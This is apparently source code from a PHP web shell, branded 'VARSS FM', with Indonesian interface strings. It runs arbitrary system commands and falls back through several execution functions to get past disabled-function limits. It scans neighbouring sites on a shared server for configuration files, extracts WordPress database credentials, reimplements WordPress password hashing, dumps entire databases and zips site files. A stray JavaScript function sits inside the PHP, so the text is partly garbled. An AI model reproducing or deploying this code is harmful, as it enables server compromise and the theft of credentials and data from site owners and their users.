$disabled_functions = array_map('trim', explode(',', ini_get('disable_functions')));

function executeCommand($cmd) {
    global $available_exec;
    if (empty($available_exec)) return ['output' => "❌ Semua fungsi eksekusi diblokir.", 'return_var' => 1, 'method' => 'none'];
    if (in_array('proc_open', $available_exec)) {
        $descriptorspec = [0 => ['pipe', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
        $process = @proc_open($cmd, $descriptorspec, $pipes);
        if (is_resource($process)) {
            fclose($pipes[0]); $stdout = stream_get_contents($pipes[1]); $stderr = stream_get_contents($pipes[2]);
            fclose($pipes[1]); fclose($pipes[2]); $return_var = proc_close($process);
            return ['output' => trim($stdout . "\n" . $stderr), 'return_var' => $return_var, 'method' => 'proc_open'];
        }
    }
    if (in_array('exec', $available_exec)) { $output = []; $return_var = -1; @exec($cmd . ' 2>&1', $output, $return_var); return ['output' => trim(implode("\n", $output)), 'return_var' => $return_var, 'method' => 'exec']; }
    if (in_array('shell_exec', $available_exec)) { $output = @shell_exec($cmd . ' 2>&1'); return ['output' => trim($output ?? ''), 'return_var' => ($output === null) ? 1 : 0, 'method' => 'shell_exec']; }
    return ['output' => " Gagal.", 'return_var' => 1, 'method' => 'none'];
}

function cleanDomain($url) {
    $url = preg_replace('#^https?://#i', '', $url);
    $url = preg_replace('#^www\.#i', '', $url);
    $url = rtrim(explode('/', $url)[0], '/');
    $url = rtrim(explode('?', $url)[0], '/');
    return strtolower($url);
}

function scanSites($base_path) {
    $sites = [];
    $config_files = ['wp-config.php', '.env', 'config.php', 'configuration.php'];
    $ignore_folders = ['wp-admin', 'wp-content', 'wp-includes', 'wp-json', 'wp-rest', 'node_modules', 'vendor', 'cache', 'logs', 'backup', 'backups', '.well-known', 'cgi-bin', 'tmp', 'temp', '__MACOSX', '.git', 'wpfm-private-backups', 'updraft', 'ai1wm-backups'];
    if (!is_dir($base_path)) return $sites;
    $items = @scandir($base_path); if ($items === false) return $sites;
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        $full_path = $base_path . '/' . $item;
        if (!is_dir($full_path)) continue;
        if (in_array(strtolower($item), array_map('strtolower', $ignore_folders))) continue;
        if (substr($item, 0, 1) === '.') continue;
        $has_config = false; $detected_domain = ''; $site_type = 'Unknown';
        foreach ($config_files as $config_file) {
            $config_path = $full_path . '/' . $config_file;
            if (file_exists($config_path)) {
                $has_config = true;
                if ($config_file === 'wp-config.php') {
                    $site_type = 'WordPress';
                    $content = @file_get_contents($config_path);
                    if ($content) {
                        if (preg_match("/define\s*\(\s*['\"]WP_HOME['\"]\s*,\s*['\"](.*?)['\"]\s*\)/i", $content, $m)) $detected_domain = cleanDomain($m[1]);
                        elseif (preg_match("/define\s*\(\s*['\"]WP_SITEURL['\"]\s*,\s*['\"](.*?)['\"]\s*\)/i", $content, $m)) $detected_domain = cleanDomain($m[1]);
                    }
                } elseif ($config_file === '.env') {
                    $site_type = 'Laravel/Modern';
                    $content = @file_get_contents($config_path);
                    if ($content && preg_match('/APP_URL\s*=\s*(https?:\/\/[^\s]+)/i', $content, $m)) $detected_domain = cleanDomain($m[1]);
                } elseif ($config_file === 'configuration.php') $site_type = 'Joomla';
                elseif ($config_file === 'config.php') $site_type = 'Custom PHP';
                break;
            }
        }
        if (!$has_config) {
            $parent_has_wp = file_exists($base_path . '/wp-config.php');
            if (!$parent_has_wp && (file_exists($full_path . '/index.php') || file_exists($full_path . '/index.html'))) { $has_config = true; $site_type = 'Static/Basic'; }
        }
        if ($has_config) {
            if (empty($detected_domain)) $detected_domain = cleanDomain($item);
            $is_active = false;
            if (filter_var($detected_domain, FILTER_VALIDATE_DOMAIN, FILTER_FLAG_HOSTNAME)) {
                $check_url = 'http://' . $detected_domain;
                $ch = @curl_init($check_url);
                if ($ch) {
                    curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER => true, CURLOPT_FOLLOWLOCATION => true, CURLOPT_TIMEOUT => 5, CURLOPT_NOBODY => true, CURLOPT_SSL_VERIFYPEER => false]);
                    @curl_exec($ch); $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE); curl_close($ch);
                    $is_active = ($http_code >= 200 && $http_code < 400);
                }
            }
            $sites[] = ['folder' => $item, 'domain' => $detected_domain, 'type' => $site_type, 'active' => $is_active, 'path' => $full_path];
        }
    }
    return $sites;
}

function find_wp_config($dir) {
    $dir = rtrim($dir, '/');
    if (file_exists($dir . '/wp-config.php')) return $dir . '/wp-config.php';
    $parent = dirname($dir);
    if ($parent !== $dir && file_exists($parent . '/wp-config.php')) return $parent . '/wp-config.php';
    return false;
}

function parse_wp_config($config_path) {
    if (!$config_path || !file_exists($config_path)) return false;
    $content = @file_get_contents($config_path); if ($content === false) return false;
    $config = [];
    foreach (['DB_NAME', 'DB_USER', 'DB_PASSWORD', 'DB_HOST', 'DB_CHARSET'] as $key) {
        if (preg_match("/define\s*\(\s*['\"]" . $key . "['\"]\s*,\s*['\"](.*?)['\"]\s*\)/i", $content, $m)) $config[$key] = $m[1];
    }
    if (preg_match("/\\\$table_prefix\s*=\s*['\"](.*?)['\"]/i", $content, $m)) $config['table_prefix'] = $m[1]; else $config['table_prefix'] = 'wp_';
    return (isset($config['DB_NAME']) && isset($config['DB_USER'])) ? $config : false;
}

class WP_PasswordHash {
    private $itoa64 = './0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
    private $iteration_count_log2; private $random_state;
    public function __construct($iteration_count_log2 = 8, $portable_hashes = true) { $this->iteration_count_log2 = $iteration_count_log2; $this->random_state = microtime() . uniqid(rand(), true); }
    private function get_random_bytes($count) {
        if (function_exists('openssl_random_pseudo_bytes')) return openssl_random_pseudo_bytes($count);
        $output = ''; if (@is_readable('/dev/urandom')) { $fh = @fopen('/dev/urandom', 'rb'); if ($fh) { $output = @fread($fh, $count); @fclose($fh); } }
        if (strlen($output) < $count) { $output = ''; for ($i = 0; $i < $count; $i += 16) { $this->random_state = md5(microtime() . $this->random_state); $output .= pack('H*', md5($this->random_state)); } $output = substr($output, 0, $count); }
        return $output;
    }
    private function encode64($input, $count) {
        $output = ''; $i = 0;
        do { $value = ord($input[$i++]); $output .= $this->itoa64[$value & 0x3f]; if ($i < $count) $value |= ord($input[$i]) << 8; $output .= $this->itoa64[($value >> 6) & 0x3f]; if ($i++ >= $count) break; if ($i < $count) $value |= ord($input[$i]) << 16; $output .= $this->itoa64[($value >> 12) & 0x3f]; if ($i++ >= $count) break; $output .= $this->itoa64[($value >> 18) & 0x3f]; } while ($i < $count);
        return $output;
    }
    private function crypt_private($password, $setting) {
        $output = '*0'; if (substr($setting, 0, 2) === $output) $output = '*1'; $id = substr($setting, 0, 3); if ($id !== '$P$' && $id !== '$H$') return $output;
        $count_log2 = strpos($this->itoa64, $setting[3]); if ($count_log2 < 7 || $count_log2 > 30) return $output; $count = 1 << $count_log2; $salt = substr($setting, 4, 8); if (strlen($salt) !== 8) return $output;
        $hash = md5($salt . $password, true); do { $hash = md5($hash . $password, true); } while (--$count); $output = substr($setting, 0, 12); $output .= $this->encode64($hash, 16); return $output;
    }
    public function HashPassword($password) { $random = $this->get_random_bytes(6); $hash = $this->crypt_private($password, '$P$' . $this->itoa64[min($this->iteration_count_log2 + 5, 30)] . $this->encode64($random, 6)); if ($hash && strlen($hash) === 34) return $hash; return md5($password); }
}

function backup_wp_database($config, $output_file) {
    $conn = @new mysqli($config['DB_HOST'], $config['DB_USER'], $config['DB_PASSWORD'], $config['DB_NAME']);
    if ($conn->connect_error) return "Gagal koneksi DB: " . $conn->connect_error;
    $conn->set_charset($config['DB_CHARSET'] ?? 'utf8mb4');
    $sql = "-- VARSS FM WordPress Database Backup\n-- Database: " . $config['DB_NAME'] . "\n-- Tanggal: " . date('Y-m-d H:i:s') . "\n\nSET NAMES utf8mb4;\nSET FOREIGN_KEY_CHECKS = 0;\n\n";
    $tables = $conn->query("SHOW TABLES"); if (!$tables) { $conn->close(); return "Gagal membaca tabel: " . $conn->error; }
    $table_count = 0;
    while ($row = $tables->fetch_row()) {
        $table = $row[0]; $table_count++;
        $create = $conn->query("SHOW CREATE TABLE `$table`"); $create_row = $create->fetch_row();
        $sql .= "DROP TABLE IF EXISTS `$table`;\n" . $create_row[1] . ";\n\n";
        $data = $conn->query("SELECT * FROM `$table`");
        if ($data && $data->num_rows > 0) {
            while ($row = $data->fetch_assoc()) { $values = []; foreach ($row as $value) { if ($value === null) $values[] = 'NULL'; else $values[] = "'" . $conn->real_escape_string($value) . "'"; } $sql .= "INSERT INTO `$table` VALUES (" . implode(',', $values) . ");\n"; }
            $sql .= "\n";
        }
    }
    $sql .= "SET FOREIGN_KEY_CHECKS = 1;\n"; $conn->close();
    if (@file_put_contents($output_file, $sql) === false) return "Gagal menulis file SQL"; return "OK|" . $table_count;
}

function backup_wp_files($source_dir, $output_zip) {
    if (!class_exists('ZipArchive')) return "ZipArchive tidak tersedia";
    $zip = new ZipArchive(); if ($zip->open($output_zip, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== true) return "Gagal membuat ZIP";
    $source_dir = realpath($source_dir); $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source_dir, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::LEAVES_ONLY);
    $file_count = 0;
    foreach ($files as $file) { if (!$file->isDir()) { $file_path = $file->getRealPath(); $relative_path = substr($file_path, strlen($source_dir) + 1); if (realpath($output_zip) === $file_path) continue; if ($zip->addFile($file_path, $relative_path)) $file_count++; } }
    $zip->close(); return "OK|" . $file_count;
}

function copySiteList() {
    var sites = document.querySelectorAll('.site-domain-text');
    var list = [];
    sites.forEach(function(site) { list.push(site.textContent.trim()); });
    var text = list.join('\n');
    if (navigator.clipboard && navigator.clipboard.writeText) {
        navigator.clipboard.writeText(text).then(function() { alert('✅ Daftar domain berhasil disalin!\n\n' + text); });
    } else {
        var textarea = document.createElement('textarea'); textarea.value = text; document.body.appendChild(textarea); textarea.select(); document.execCommand('copy'); document.body.removeChild(textarea); alert('✅ Daftar domain berhasil disalin!\n\n' + text);
    }
}
